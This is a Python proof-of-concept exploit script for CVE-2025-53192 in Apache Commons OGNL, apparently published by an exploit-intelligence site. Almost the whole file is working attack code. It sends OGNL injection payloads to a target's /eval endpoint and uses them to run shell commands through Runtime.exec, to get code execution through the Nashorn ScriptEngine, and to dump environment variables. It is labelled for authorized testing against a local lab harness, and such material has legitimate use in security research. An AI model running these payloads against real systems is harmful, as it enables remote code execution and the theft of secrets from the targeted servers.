#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache Commons OGNL — Variable Chain + ScriptEngine RCE
# CVE            : CVE-2025-53192
# Vendor         : Apache Software Foundation
# Product        : Apache Commons OGNL
# Affected       : All versions (project retired, no fix)
# Type           : CWE-146 - Expression/Command Delimiter Injection
# CVSS           : 8.8 (HIGH)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-53192 — Vector 3: Advanced Techniques

Sub-vector A: OGNL Variable Assignment Chain
  ASTSequence → ASTAssign + ASTVarRef — splits attack across sub-expressions.

Sub-vector B: Nashorn ScriptEngine Execution
  RCE via JavaScript engine without directly calling Runtime.exec() from OGNL.

Sub-vector C: Environment exfiltration via @System@getenv() (no process spawn).

PREREQUISITES:
  - Python 3 (stdlib only)
  - Target HTTP service running (docker compose up -d)

USAGE:
  python3 poc_vector3.py <host> <port>
  python3 poc_vector3.py localhost 8531

REFERENCES:
  - CVE-2025-53192
  - https://github.com/advisories/GHSA-5vgh-76mj-8hcq
"""

import sys
import urllib.request
import urllib.error

RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
RESET = "\033[0m"


def ognl_eval(base_url, expression):
    """POST an OGNL expression to the harness and return the response body."""
    url = f"{base_url}/eval"
    req = urllib.request.Request(
        url,
        data=expression.encode("utf-8"),
        headers={"Content-Type": "text/plain"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.read().decode("utf-8", errors="replace"), resp.status
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return body, e.code
    except Exception as e:
        return str(e), 0


def check_health(base_url):
    try:
        req = urllib.request.Request(f"{base_url}/health")
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status == 200
    except Exception:
        return False


def exploit(host, port):
    base_url = f"http://{host}:{port}"

    print(f"{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}  CVE-2025-53192 Vector 3: Advanced Techniques{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print()
    print(f"  {YELLOW}Target:{RESET}        {base_url}")
    print(f"  {YELLOW}Sub-vector A:{RESET} OGNL variable chain (ASTSequence + ASTAssign)")
    print(f"  {YELLOW}Sub-vector B:{RESET} Nashorn ScriptEngine (JavaScript → Java RCE)")
    print(f"  {YELLOW}Sub-vector C:{RESET} Environment exfiltration (no shell process)")
    print()

    # Health check
    print(f"  [1/4] Checking target...", end=" ")
    if not check_health(base_url):
        print(f"{RED}FAILED{RESET}")
        return False
    print(f"{GREEN}OK{RESET}")

    results = {}

    # === Sub-vector A: OGNL variable chain ===
    expr_a = (
        '(#rt = @java.lang.Runtime@getRuntime(), '
        '#cmd = new java.lang.String[]{"sh","-c","uname -a"}, '
        '#rt.exec(#cmd))'
    )
    print(f"  [2/4] Sub-vector A: OGNL variable assignment chain...", end=" ")
    result_a, status_a = ognl_eval(base_url, expr_a)

    if status_a == 200 and result_a.strip():
        print(f"{GREEN}OK{RESET}")
        results["A"] = True
    else:
        print(f"{RED}FAILED{RESET}")
        results["A"] = False

    # === Sub-vector B: ScriptEngine ===
    expr_b = (
        '(#mgr = new javax.script.ScriptEngineManager(), '
        '#eng = #mgr.getEngineByName("js"), '
        '#cmd = "id", '
        '#eng.put("cmd", #cmd), '
        '#eng.eval("java.lang.Runtime.getRuntime().exec(cmd)"))'
    )
    print(f"  [3/4] Sub-vector B: Nashorn ScriptEngine...", end=" ")
    result_b, status_b = ognl_eval(base_url, expr_b)

    if status_b == 200 and result_b.strip():
        print(f"{GREEN}OK{RESET}")
        results["B"] = True
    else:
        print(f"{RED}FAILED{RESET}")
        results["B"] = False

    # === Sub-vector C: Environment exfiltration ===
    expr_c = '@java.lang.System@getenv()'
    print(f"  [4/4] Sub-vector C: Environment exfiltration...", end=" ")
    result_c, status_c = ognl_eval(base_url, expr_c)

    if status_c == 200 and "PATH" in result_c:
        print(f"{GREEN}OK{RESET}")
        results["C"] = True
    else:
        print(f"{RED}FAILED{RESET}")
        results["C"] = False

    # Display results
    print()
    print(f"  {CYAN}[Sub-vector A] OGNL Variable Assignment Chain:{RESET}")
    print(f"  {YELLOW}AST path:{RESET} ASTSequence → ASTAssign(#rt) → ASTAssign(#cmd) → ASTMethod(#rt.exec)")
    if results["A"]:
        print(f"  {GREEN}[SUCCEEDED]{RESET} → {RED}{result_a.strip()}{RESET}")
    else:
        print(f"  {RED}[FAILED]{RESET}")
    print()

    print(f"  {CYAN}[Sub-vector B] Nashorn ScriptEngine Execution:{RESET}")
    print(f"  {YELLOW}Technique:{RESET} OGNL creates ScriptEngineManager → JS engine → eval(JavaScript)")
    if results["B"]:
        print(f"  {GREEN}[SUCCEEDED]{RESET} → {RED}{result_b.strip()}{RESET}")
        print(f"  {YELLOW}Note:{RESET} RCE achieved WITHOUT directly calling Runtime.exec() from OGNL")
    else:
        print(f"  {RED}[FAILED]{RESET}")
    print()

    print(f"  {CYAN}[Sub-vector C] Environment Variable Exfiltration:{RESET}")
    if results["C"]:
        # Show a few interesting env vars from the map string
        env_str = result_c.strip()
        print(f"  {RED}┌──────────────────────────────────────────────{RESET}")
        # Parse {KEY=VAL, KEY=VAL, ...} format
        inner = env_str.strip("{}")
        for part in inner.split(", ")[:5]:
            print(f"  {RED}│ {part}{RESET}")
        print(f"  {RED}│ ... (truncated){RESET}")
        print(f"  {RED}└──────────────────────────────────────────────{RESET}")
        print(f"  {GREEN}✓ Info exfiltration without spawning any process{RESET}")
    else:
        print(f"  {RED}[FAILED]{RESET}")
    print()

    all_ok = all(results.values())
    if all_ok:
        print(f"  {GREEN}✓ All 3 advanced techniques confirmed{RESET}")
    else:
        passed = sum(1 for v in results.values() if v)
        total = len(results)
        print(f"  {YELLOW}⚠ {passed}/{total} techniques succeeded{RESET}")

    return all_ok


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        print(f"Example: {sys.argv[0]} localhost 8531")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    success = exploit(host, port)
    sys.exit(0 if success else 1)
